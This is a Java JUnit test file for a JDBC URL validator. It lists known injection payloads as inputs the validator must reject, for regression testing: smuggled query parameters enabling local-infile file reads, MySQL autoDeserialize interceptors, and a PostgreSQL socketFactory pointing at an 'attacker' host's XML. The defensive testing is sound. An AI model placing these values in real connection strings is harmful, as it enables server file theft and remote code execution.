package com.synctask.util;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.*;

/**
 * JDBC URL 注入闸门的判据。
 *
 * <p>用例来自 2026-08-19 审查中<b>实测通过原正则</b>的三个 payload——它们当时能完整
 * 通过连接串校验并被拼进 JDBC URL。这里把它们钉成回归用例：任何一条重新变成
 * "合法"，都意味着注入面又开了。
 */
class JdbcUrlSafetyTest {

    // ---------------- 主机名 ----------------

    @Test
    @DisplayName("正常主机名/IP/IPv6 通过")
    void acceptsNormalHosts() {
        assertEquals("127.0.0.1", JdbcUrlSafety.requireSafeHost("127.0.0.1"));
        assertEquals("localhost", JdbcUrlSafety.requireSafeHost("localhost"));
        assertEquals("db-prod-01.internal.example.com",
                JdbcUrlSafety.requireSafeHost("db-prod-01.internal.example.com"));
        assertEquals("[::1]", JdbcUrlSafety.requireSafeHost("[::1]"));
        assertEquals("127.0.0.1", JdbcUrlSafety.requireSafeHost("  127.0.0.1  "));
    }

    @Test
    @DisplayName("主机名里夹带 URL 结构字符一律拒绝")
    void rejectsHostWithUrlStructure() {
        for (String bad : new String[]{
                "10.0.0.9/x?allowLoadLocalInfile=true",
                "10.0.0.9&user=root",
                "10.0.0.9#frag",
                "evil.com\nX-Injected: 1",
                "", "   "}) {
            assertThrows(IllegalArgumentException.class,
                    () -> JdbcUrlSafety.requireSafeHost(bad), "应拒绝: " + bad);
        }
        assertThrows(IllegalArgumentException.class, () -> JdbcUrlSafety.requireSafeHost(null));
    }

    // ---------------- 端口 ----------------

    @Test
    @DisplayName("端口范围")
    void portRange() {
        assertEquals(3306, JdbcUrlSafety.requireSafePort(3306));
        assertEquals(1, JdbcUrlSafety.requireSafePort(1));
        assertEquals(65535, JdbcUrlSafety.requireSafePort(65535));
        assertThrows(IllegalArgumentException.class, () -> JdbcUrlSafety.requireSafePort(0));
        assertThrows(IllegalArgumentException.class, () -> JdbcUrlSafety.requireSafePort(65536));
        assertThrows(IllegalArgumentException.class, () -> JdbcUrlSafety.requireSafePort(-1));
    }

    // ---------------- 库名 ----------------

    @Test
    @DisplayName("正常库名通过；空库名放行（不少链路是先连上再切库）")
    void acceptsNormalDatabases() {
        assertEquals("sync_task_db", JdbcUrlSafety.requireSafeDatabase("sync_task_db"));
        assertEquals("ORCLPDB1", JdbcUrlSafety.requireSafeDatabase("ORCLPDB1"));
        assertEquals("app.svc", JdbcUrlSafety.requireSafeDatabase("app.svc"));
        assertNull(JdbcUrlSafety.requireSafeDatabase(null));
        assertEquals("", JdbcUrlSafety.requireSafeDatabase(""));
    }

    @Test
    @DisplayName("库名里出现 ? 或 & 即注入企图，拒绝")
    void rejectsDatabaseWithQueryString() {
        for (String bad : new String[]{
                "db?allowLoadLocalInfile=true&allowUrlInLocalInfile=true",
                "db?autoDeserialize=true",
                "db&user=root",
                "db?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext"}) {
            assertThrows(IllegalArgumentException.class,
                    () -> JdbcUrlSafety.requireSafeDatabase(bad), "应拒绝: " + bad);
        }
    }

    // ---------------- 已拼好的 URL 上的黑名单 ----------------

    @Test
    @DisplayName("三个实测 payload 对应的危险参数在成品 URL 上也被拦下")
    void rejectsForbiddenParamsInAssembledUrl() {
        String[] bad = {
                "jdbc:mysql://h:3306/db?allowLoadLocalInfile=true&serverTimezone=UTC",
                "jdbc:mysql://h:3306/db?useSSL=false&allowUrlInLocalInfile=true",
                "jdbc:mysql://h:3306/db?autoDeserialize=true",
                "jdbc:mysql://h:3306/db?queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
                "jdbc:postgresql://h:5432/db?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext",
                "jdbc:postgresql://h:5432/db?socketFactoryArg=http://attacker/x.xml",
                // 大小写不敏感
                "jdbc:mysql://h:3306/db?AllowLoadLocalInfile=TRUE",
        };
        for (String url : bad) {
            assertThrows(IllegalArgumentException.class,
                    () -> JdbcUrlSafety.requireSafeUrl(url), "应拒绝: " + url);
        }
    }

    @Test
    @DisplayName("工程自己拼的那些正常参数不受影响")
    void allowsLegitimateUrls() {
        String[] ok = {
                "jdbc:mysql://127.0.0.1:3306/sync_task_db?sslMode=REQUIRED&serverTimezone=UTC"
                        + "&characterEncoding=utf8&allowPublicKeyRetrieval=true",
                "jdbc:postgresql://127.0.0.1:5432/app?currentSchema=public&stringtype=unspecified",
                "jdbc:mysql://h:3306/db",   // 无查询串
                null,
        };
        for (String url : ok) {
            assertDoesNotThrow(() -> JdbcUrlSafety.requireSafeUrl(url), "应放行: " + url);
        }
    }

    @Test
    @DisplayName("子串不误伤：initialSize= 不应被 init= 命中")
    void doesNotFalsePositiveOnSubstrings() {
        assertDoesNotThrow(() ->
                JdbcUrlSafety.requireSafeUrl("jdbc:mysql://h:3306/db?initialSize=5&maxInit=3"));
    }
}
